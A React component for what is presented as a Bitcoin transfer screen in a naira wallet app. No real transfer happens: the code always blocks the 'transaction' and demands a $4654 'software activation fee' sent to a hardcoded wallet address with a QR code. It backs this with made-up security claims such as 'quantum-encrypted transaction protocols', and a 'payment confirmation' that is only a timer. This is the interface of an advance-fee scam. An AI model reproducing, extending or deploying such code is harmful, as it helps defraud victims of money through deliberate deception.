import { CodeBackground } from "@/components/code-background"
import { ArrowLeft, Bitcoin, AlertTriangle, Shield, Lock, DollarSign, Cpu, Copy, CheckCircle, Loader } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { useState } from "react"
import Image from "next/image"
import BitcoinTransferLoading from "@/components/bitcoin-transfer-loading"

interface BitcoinTransferProps {
  onBack: () => void
  walletBalance: number
  onTransferComplete?: (amount: number, bitcoinAddress: string) => void
}

export function BitcoinTransfer({ onBack, walletBalance, onTransferComplete }: BitcoinTransferProps) {
  const [bitcoinAddress, setBitcoinAddress] = useState("")
  const [nairaAmount, setNairaAmount] = useState("")
  const BITCOIN_RATE = 69345.00
  const NAIRA_TO_USD_RATE = 1630
  const [bitcoinAmount, setBitcoinAmount] = useState("")
  const [error, setError] = useState("")
  const [transferring, setTransferring] = useState(false)
  const [processingStage, setProcessingStage] = useState<"form" | "processing" | "complete" | "activation-payment" | "activation-processing">("form")
  const [copied, setCopied] = useState(false)
  const ACTIVATION_FEE = 4654
  const WALLET_ADDRESS = "0xb535Dff88de8c17fF34df2d356a78fe8C050537d"

  const handleNairaChange = (value: string) => {
    const cleanValue = value.replace(/[^\d.]/g, "")
    setNairaAmount(cleanValue)
    setError("")

    if (cleanValue) {
      const nairaNum = Number.parseFloat(cleanValue)

      if (nairaNum > walletBalance) {
        setError(`Insufficient wallet balance. Available: ₦${walletBalance.toLocaleString("en-NG", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`)
        setBitcoinAmount("")
        return
      }

      // Convert NGN to USD to BTC
      const usdAmount = nairaNum / NAIRA_TO_USD_RATE
      const btcAmount = usdAmount / BITCOIN_RATE
      setBitcoinAmount(btcAmount.toFixed(8))
    } else {
      setBitcoinAmount("")
    }
  }

  const handleTransfer = () => {
    setError("")

    if (!bitcoinAddress.trim()) {
      setError("Please enter a valid Bitcoin address")
      return
    }

    if (!nairaAmount || Number.parseFloat(nairaAmount) <= 0) {
      setError("Please enter a valid amount")
      return
    }

    if (Number.parseFloat(nairaAmount) > walletBalance) {
      setError("Insufficient wallet balance")
      return
    }

    setProcessingStage("processing")
    setTransferring(true)
  }

  if (processingStage === "processing") {
    return (
      <BitcoinTransferLoading 
        bitcoinAmount={bitcoinAmount} 
        bitcoinAddress={bitcoinAddress}
        walletBalance={walletBalance}
        nairaAmount={nairaAmount}
        onComplete={() => setProcessingStage("complete")} 
      />
    )
  }

  const handleProceedWithActivation = () => {
    setProcessingStage("activation-payment")
  }

  const handleCopyAddress = () => {
    navigator.clipboard.writeText(WALLET_ADDRESS)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const handleConfirmPayment = () => {
    setProcessingStage("activation-processing")
    // Simulate payment processing
    setTimeout(() => {
      setProcessingStage("complete")
    }, 3000)
  }

  // Activation Payment Screen
  if (processingStage === "activation-payment") {
    return (
      <div className="fixed inset-0 z-50 bg-black overflow-y-auto">
        <CodeBackground />

        <div className="relative z-10 w-full max-w-2xl mx-auto px-4 py-8 min-h-full">
          {/* Header */}
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-gradient-to-br from-red-600 to-red-900 rounded-2xl flex items-center justify-center shadow-2xl shadow-red-900/60 border-2 border-red-500/40 mx-auto mb-4">
              <DollarSign className="w-10 h-10 text-white" />
            </div>
            <h1 className="text-2xl font-black mb-2 bg-gradient-to-r from-red-400 to-orange-600 bg-clip-text text-transparent">
              PAYMENT WALLET
            </h1>
            <p className="text-gray-400 text-sm">Send activation fee to complete transaction</p>
          </div>

          {/* Activation Fee Display */}
          <div className="bg-red-950/40 border-2 border-red-600/40 rounded-xl p-6 mb-4 backdrop-blur-md text-center">
            <p className="text-sm text-gray-400 mb-2 uppercase tracking-wider">Activation Fee Required</p>
            <p className="text-4xl font-black text-red-400 mb-2">${ACTIVATION_FEE}</p>
            <p className="text-xs text-gray-500">One-time payment for lifetime access</p>
          </div>

          {/* Wallet Address */}
          <div className="bg-gray-900/60 border-2 border-red-600/30 rounded-xl p-5 mb-4 backdrop-blur-md">
            <p className="text-xs text-gray-400 uppercase tracking-wider mb-3">Send Payment To</p>
            
            {/* Address Display */}
            <div className="bg-black/80 border border-red-500/30 rounded-lg p-4 mb-4">
              <p className="text-xs text-gray-500 mb-2">Wallet Address</p>
              <div className="flex items-center gap-2">
                <code className="text-sm font-mono text-red-400 break-all flex-1">{WALLET_ADDRESS}</code>
                <button
                  onClick={handleCopyAddress}
                  className="flex-shrink-0 p-2 hover:bg-red-900/40 rounded-lg transition-colors"
                >
                  {copied ? (
                    <CheckCircle className="w-5 h-5 text-green-400" />
                  ) : (
                    <Copy className="w-5 h-5 text-red-400" />
                  )}
                </button>
              </div>
            </div>

            {/* QR Code Display */}
            <div className="bg-gradient-to-br from-red-950/40 to-orange-950/40 rounded-lg p-6 mb-4 text-center border border-red-600/30 flex flex-col items-center">
              <Image
                src="/bnb-wallet-qr.png"
                alt="BNB Wallet QR Code"
                width={280}
                height={360}
                className="rounded-lg shadow-lg"
              />
              <p className="text-xs text-gray-500 mt-4">Scan to send payment or copy address below</p>
            </div>

            {/* Address Display */}
            <div className="bg-black/80 border border-red-500/30 rounded-lg p-4 mb-4">
              <p className="text-xs text-gray-500 mb-2">Wallet Address</p>
              <div className="flex items-center gap-2">
                <code className="text-xs font-mono text-red-400 break-all flex-1">{WALLET_ADDRESS}</code>
                <button
                  onClick={handleCopyAddress}
                  className="flex-shrink-0 p-2 hover:bg-red-900/40 rounded-lg transition-colors"
                >
                  {copied ? (
                    <CheckCircle className="w-5 h-5 text-green-400" />
                  ) : (
                    <Copy className="w-5 h-5 text-red-400" />
                  )}
                </button>
              </div>
            </div>

            <div className="bg-red-950/40 border border-red-600/30 rounded-lg p-3">
              <p className="text-xs text-red-300 leading-relaxed">
                <strong>Send exactly ${ACTIVATION_FEE}</strong> to the wallet address above. Once payment is confirmed by the network, your transaction will be automatically processed.
              </p>
            </div>
          </div>

          {/* Buttons */}
          <div className="space-y-3">
            <Button
              onClick={handleConfirmPayment}
              className="w-full bg-gradient-to-r from-red-600 to-orange-600 hover:from-red-700 hover:to-orange-700 text-white font-bold py-3 rounded-lg border border-red-500/40 shadow-lg shadow-red-900/40"
            >
              <CheckCircle className="w-4 h-4 mr-2" />
              I Have Sent the Payment
            </Button>

            <Button
              onClick={() => setProcessingStage("complete")}
              variant="outline"
              className="w-full bg-gray-900/60 border-gray-700 text-white hover:bg-gray-800 py-3"
            >
              <ArrowLeft className="w-4 h-4 mr-2" />
              Back to Activation Info
            </Button>
          </div>
        </div>
      </div>
    )
  }

  // Activation Processing Screen
  if (processingStage === "activation-processing") {
    return (
      <div className="fixed inset-0 z-50 bg-black overflow-y-auto">
        <CodeBackground />

        <div className="relative z-10 w-full max-w-2xl mx-auto px-4 py-8 min-h-full flex items-center justify-center">
          <div className="text-center">
            <div className="w-20 h-20 bg-gradient-to-br from-red-600 to-red-900 rounded-2xl flex items-center justify-center shadow-2xl shadow-red-900/60 border-2 border-red-500/40 mx-auto mb-6 animate-spin">
              <Loader className="w-10 h-10 text-white" />
            </div>

            <h1 className="text-2xl font-black mb-2 bg-gradient-to-r from-red-400 to-orange-600 bg-clip-text text-transparent">
              AWAITING PAYMENT CONFIRMATION
            </h1>

            <p className="text-gray-400 text-sm mb-2">Processing your activation payment...</p>

            <div className="bg-red-950/40 border border-red-600/40 rounded-lg p-4 mt-6 max-w-xs mx-auto">
              <p className="text-xs text-gray-300 leading-relaxed">
                Our system is verifying your payment on the blockchain. This may take a few moments. Once confirmed, your transaction will proceed automatically.
              </p>
            </div>
          </div>
        </div>
      </div>
    )
  }

  if (processingStage === "complete") {
    const transferredAmount = Number.parseFloat(nairaAmount.replace(/,/g, "")) || 0

    return (
      <div className="fixed inset-0 z-50 bg-black overflow-y-auto">
        <CodeBackground />

        <div className="relative z-10 w-full max-w-2xl mx-auto px-4 py-8 min-h-full">
          {/* Warning Header */}
          <div className="text-center mb-6">
            <div className="relative w-20 h-20 mx-auto mb-4">
              {/* Pulsing rings */}
              <div className="absolute inset-0 rounded-full border-2 border-red-500/30 animate-ping"></div>
              <div className="absolute inset-2 rounded-full border-2 border-yellow-500/30 animate-pulse"></div>
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="w-16 h-16 bg-gradient-to-br from-red-600 to-orange-900 rounded-2xl flex items-center justify-center shadow-2xl shadow-red-900/60 border-2 border-red-500/40">
                  <AlertTriangle className="w-10 h-10 text-white" />
                </div>
              </div>
            </div>
            <h1 className="text-2xl font-black mb-2 bg-gradient-to-r from-red-400 via-orange-500 to-yellow-600 bg-clip-text text-transparent">
              SOFTWARE ACTIVATION REQUIRED
            </h1>
            <p className="text-gray-400 text-sm">Transaction cannot be completed without activation</p>
          </div>

          {/* Transaction Status */}
          <div className="bg-red-950/40 border-2 border-red-600/40 rounded-xl p-5 mb-4 backdrop-blur-md">
            <div className="flex items-center gap-3 mb-4">
              <Lock className="w-6 h-6 text-red-400" />
              <div>
                <p className="text-sm font-bold text-red-400">TRANSACTION BLOCKED</p>
                <p className="text-xs text-gray-400">Security protocol requires software activation</p>
              </div>
            </div>
            
            <div className="space-y-3 border-t border-red-600/30 pt-4">
              <div className="flex justify-between items-center">
                <span className="text-xs text-gray-400">Pending Amount:</span>
                <span className="text-sm font-bold text-red-400">₦{transferredAmount.toLocaleString("en-NG", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-xs text-gray-400">BTC Equivalent:</span>
                <span className="text-sm font-bold text-orange-400">{bitcoinAmount} BTC</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-xs text-gray-400">Destination:</span>
                <span className="text-xs font-mono text-gray-300 truncate max-w-[150px]">{bitcoinAddress}</span>
              </div>
            </div>
          </div>

          {/* Activation Required Box */}
          <div className="bg-gradient-to-br from-yellow-950/40 to-orange-950/40 border-2 border-yellow-600/40 rounded-xl p-5 mb-4 backdrop-blur-md">
            <div className="flex items-center gap-3 mb-4">
              <div className="w-12 h-12 bg-gradient-to-br from-yellow-600 to-orange-900 rounded-xl flex items-center justify-center border border-yellow-500/40">
                <Cpu className="w-7 h-7 text-white" />
              </div>
              <div>
                <p className="text-sm font-bold text-yellow-400">SOFTWARE ACTIVATION</p>
                <p className="text-xs text-gray-400">Required for external wallet transfers</p>
              </div>
            </div>

            <div className="bg-black/40 rounded-lg p-4 mb-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <DollarSign className="w-6 h-6 text-yellow-400" />
                  <div>
                    <p className="text-xs text-gray-400 uppercase tracking-wider">Activation Fee</p>
                    <p className="text-2xl font-black text-red-400">${ACTIVATION_FEE}</p>
                  </div>
                </div>
                <div className="text-right">
                  <p className="text-xs text-gray-400">One-time fee</p>
                  <p className="text-xs text-yellow-300 font-semibold">Lifetime access</p>
                </div>
              </div>
            </div>

            <div className="space-y-2 text-xs text-gray-300">
              <div className="flex items-start gap-2">
                <Shield className="w-4 h-4 text-green-400 flex-shrink-0 mt-0.5" />
                <span>Ensures maximum security for all external transfers</span>
              </div>
              <div className="flex items-start gap-2">
                <Lock className="w-4 h-4 text-blue-400 flex-shrink-0 mt-0.5" />
                <span>Activates quantum-encrypted transaction protocols</span>
              </div>
              <div className="flex items-start gap-2">
                <Cpu className="w-4 h-4 text-purple-400 flex-shrink-0 mt-0.5" />
                <span>Enables unlimited Bitcoin wallet transfers</span>
              </div>
            </div>
          </div>

          {/* Info Notice */}
          <div className="bg-gray-900/60 border border-gray-800 rounded-lg p-4 mb-6">
            <p className="text-xs text-gray-300 leading-relaxed">
              <strong className="text-red-400">Important:</strong> Your transaction of ₦{transferredAmount.toLocaleString("en-NG")} to the Bitcoin wallet is currently on hold. The software activation fee of ${ACTIVATION_FEE} is required to verify transaction integrity and ensure secure fund delivery. This is a one-time payment that enables all future external transfers.
            </p>
          </div>

          {/* Buttons */}
          <div className="space-y-3">
            <Button
              onClick={handleProceedWithActivation}
              className="w-full bg-gradient-to-r from-red-600 to-orange-600 hover:from-red-700 hover:to-orange-700 text-white font-bold py-3 rounded-lg border border-red-500/40 shadow-lg shadow-red-900/40"
            >
              <DollarSign className="w-4 h-4 mr-2" />
              Proceed with ${ACTIVATION_FEE} Activation
            </Button>
            
            <Button onClick={onBack} variant="outline" className="w-full bg-gray-900/60 border-gray-700 text-white hover:bg-gray-800 py-3">
              <ArrowLeft className="w-4 h-4 mr-2" />
              Back to Wallet
            </Button>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="fixed inset-0 z-50 bg-black flex items-center justify-center overflow-y-auto py-8">
      <CodeBackground />

      <div className="relative z-10 w-full max-w-2xl px-4">

        {/* Header */}
        <div className="text-center mb-4">
          <div className="flex justify-center mb-2">
            <div className="w-12 h-12 bg-gradient-to-br from-orange-600 to-yellow-900 rounded-xl flex items-center justify-center shadow-lg shadow-orange-900/40 border border-orange-500/40">
              <Bitcoin className="w-7 h-7 text-white" />
            </div>
          </div>
          <h1 className="text-xl font-black mb-1 bg-gradient-to-r from-orange-400 via-yellow-500 to-orange-600 bg-clip-text text-transparent">
            BITCOIN TRANSFER
          </h1>
          <p className="text-gray-400 text-xs">Transfer funds to Bitcoin wallet</p>
        </div>

        {/* Current Exchange Rate */}
        <div className="bg-gradient-to-br from-yellow-950/40 to-orange-950/40 border border-yellow-600/40 rounded-lg p-4 mb-4 backdrop-blur-md text-center">
          <p className="text-xs text-gray-400 uppercase tracking-wider mb-1">Current Bitcoin Rate</p>
          <p className="text-2xl font-black text-yellow-400">
            ${BITCOIN_RATE.toFixed(2)} per BTC
          </p>
        </div>

        {/* Wallet Balance */}
        <div className="bg-gradient-to-br from-purple-950/40 to-violet-950/40 border border-purple-600/40 rounded-lg p-4 mb-4 backdrop-blur-md text-center">
          <p className="text-xs text-gray-400 uppercase tracking-wider mb-1">Available Wallet Balance</p>
          <p className="text-2xl font-black text-purple-400">
            ₦{walletBalance.toLocaleString("en-NG", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
          </p>
        </div>

        {/* Transfer Form */}
        <div className="bg-gray-900/60 border border-gray-800 rounded-lg p-4 backdrop-blur-md mb-4 space-y-3">
          {/* Bitcoin Address Input */}
          <div>
            <label className="block text-xs font-semibold text-gray-300 mb-1 uppercase tracking-wider">
              Bitcoin Wallet Address
            </label>
            <input
              type="text"
              value={bitcoinAddress}
              onChange={(e) => setBitcoinAddress(e.target.value)}
              placeholder="Enter Bitcoin wallet address"
              className="w-full bg-black/60 border border-gray-700 text-white font-mono text-xs px-3 py-2 rounded-lg focus:border-orange-500 focus:ring-1 focus:ring-orange-500/20"
            />
          </div>

          {/* Naira Amount Input */}
          <div>
            <label className="block text-xs font-semibold text-gray-300 mb-1 uppercase tracking-wider">
              Amount in Nigerian Naira (₦)
            </label>
            <div className="relative">
              <span className="absolute left-3 top-1/2 -translate-y-1/2 text-lg font-bold text-gray-500">₦</span>
              <input
                type="text"
                value={nairaAmount}
                onChange={(e) => handleNairaChange(e.target.value)}
                placeholder="0.00"
                className="w-full bg-black/60 border border-gray-700 text-white text-lg font-bold pl-8 pr-3 py-2 rounded-lg focus:border-orange-500 focus:ring-1 focus:ring-orange-500/20"
              />
            </div>
          </div>

          {/* Bitcoin Amount Display */}
          {bitcoinAmount && (
            <div className="bg-orange-950/40 border border-orange-600/40 rounded-lg p-3">
              <p className="text-xs text-gray-400 mb-1">You will transfer</p>
              <p className="text-xl font-black text-orange-400">{bitcoinAmount} BTC</p>
            </div>
          )}

          {error && (
            <div className="bg-red-950/40 border border-red-600/40 rounded-lg p-2 flex items-center gap-2">
              <AlertTriangle className="w-3 h-3 text-red-400 flex-shrink-0" />
              <p className="text-xs text-red-300">{error}</p>
            </div>
          )}

          <Button
            onClick={handleTransfer}
            disabled={transferring || !bitcoinAddress || !nairaAmount}
            className="w-full bg-gradient-to-r from-orange-600 to-yellow-600 hover:from-orange-700 hover:to-yellow-700 text-white font-bold py-2 rounded-lg text-sm shadow-lg shadow-orange-900/40 border border-orange-500/40 disabled:opacity-50"
          >
            <Bitcoin className="w-4 h-4 mr-1" />
            {transferring ? "Transferring..." : "Send to Bitcoin"}
          </Button>
        </div>

        {/* Security Notice */}
        <div className="bg-orange-950/30 border border-orange-600/30 rounded-lg p-3 mb-4">
          <p className="text-xs text-orange-300 text-center leading-relaxed">
            Bitcoin transfers are processed immediately at current market rate. All transactions are encrypted and anonymous.
          </p>
        </div>

        {/* Back Button */}
        <Button onClick={onBack} className="w-full bg-gradient-to-r from-gray-800 to-gray-900 hover:from-gray-700 hover:to-gray-800 text-white font-bold py-3 rounded-lg border border-gray-700 hover:border-orange-500">
          <ArrowLeft className="w-4 h-4 mr-2" />
          Back to Wallet
        </Button>
      </div>
    </div>
  )
}
